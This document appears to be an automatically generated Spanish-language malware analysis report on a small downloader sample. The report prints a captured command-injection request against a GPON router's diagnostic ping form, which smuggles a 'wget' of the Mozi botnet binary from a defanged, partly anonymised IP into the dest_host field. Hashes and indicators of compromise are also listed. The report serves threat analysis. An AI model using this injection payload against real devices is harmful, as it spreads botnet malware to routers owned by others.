# 🧬 Payload Analysis

`6bfcfc0dc3febc9360e23b2fcdf7ec5d654f521f57407c93f6d55647d5a08fc7`

## 📌 Resumen

Texto ASCII de 320 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://124.29.247.XXX:48921/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://124.29.247.XXX:48921/Mozi.m -O ->/tmp/gpon80` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/6bfcfc0dc3febc9360e23b2fcdf7ec5d654f521f57407c93f6d55647d5a08fc7.md](../../../../../malware-like/oraculo/downloader/6bfcfc0dc3febc9360e23b2fcdf7ec5d654f521f57407c93f6d55647d5a08fc7.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:43:14.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `6bfcfc0dc3febc9360e23b2fcdf7ec5d654f521f57407c93f6d55647d5a08fc7`
- **SHA1:** `bc045d404e973ad6eda9289a1e2a31d3d78cc5c0`
- **MD5:** `672f0569e9b79671e01aa64a4fd1c41f`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 320 B |
| Entropía | 5.43 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://124.29.247.XXX:48921/Mozi.m+-O+->/tmp/gpon80;s
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://124.29.247.XXX:48921/Mozi.m+-O+- | strings |
| ip | 124.29.247.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://124.29.247.XXX:48921/Mozi.m+-O+->/tmp/gpon80;s | strings |
| hash | 6bfcfc0dc3febc9360e23b2fcdf7ec5d654f521f57407c93f6d55647d5a08fc7 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
